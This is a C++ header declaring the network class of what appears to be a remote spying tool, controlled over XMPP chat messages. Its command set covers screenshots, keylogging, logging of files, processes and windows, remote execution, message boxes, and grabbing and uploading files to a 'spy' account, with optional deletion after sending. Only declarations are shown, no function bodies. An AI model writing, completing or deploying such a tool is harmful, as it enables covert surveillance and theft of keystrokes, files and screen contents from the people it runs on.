
#pragma once
#include "stdafx.h"

namespace network
{
	class network_t : public ConnectionListener, PresenceHandler, 
		MessageSessionHandler, MessageHandler
	{
	public:
		network_t();
		~network_t();

		void start();
		
		enum { PING, SCREENSHOT, LOG_KEYS, LOG_DIRECTORIES, LOG_FILES, LOG_PROCESSES, LOG_WINDOWS, 
			RESET_TRACKING, EXECUTE, MESSAGE_BOX, TRACK_PROCESSES, TRACK_WINDOWS, GRAB_FILES, DOWNLOAD_ALL };

	public:
		function<void(path)> make_screenshot;
		function<void(path)> log_keys;
		function<void()> log_directories;
		function<void(path)> log_processes;
		function<void(path)> log_windows;
		function<void()> reset_tracking;
		function<void(vector<wstring>)> log_files;
		function<void(vector<wstring>)> exec_line;
		function<void(vector<wstring>)> message_box;
		function<void(vector<wstring>)> grab_files;
		function<void(wstring)> track_processes;
		function<void(wstring)> track_windows;
		
	protected:
		virtual void onConnect();
		virtual void onDisconnect(ConnectionError e);
		virtual bool onTLSConnect(const CertInfo & info);
		virtual void handleMessage(const Message & msg, MessageSession * session);
		virtual void handleMessageSession(MessageSession * session);
		virtual void handlePresence(const Presence & presence);

	private:
		void ping();
		void send_files(bool delete_after);
		void try_connect(milliseconds delay);
		void receive_loop(milliseconds delay);
		bool online() const;

		void parse_cmd(const wstring & cmd);
		void simple_cmd(const wstring & cmd);
		void complex_cmd(const vector<wstring> & cmds);
		vector<wstring> separate_cmd(const wstring & cmd) const;

		void prepare_files(const vector<wstring> & files);
		bool send_file(const path & file);

	private:
		JID spy;
		JID terminal;
		string password;
		Client * client;
		MessageSession * session;
		queue<path> files_queue;
		bool connected;
	};
}